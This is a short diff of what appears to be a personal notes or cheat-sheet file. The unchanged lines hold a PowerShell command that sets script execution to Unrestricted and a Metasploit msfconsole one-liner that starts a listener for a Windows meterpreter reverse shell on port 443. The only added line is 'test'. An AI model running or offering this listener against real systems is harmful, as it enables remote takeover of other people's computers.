@@ -7,3 +7,5 @@ Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser
 # Powershell Enable Scripts
 
 msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST 192.168.x.1;set LPORT 443;run;"
+
+test
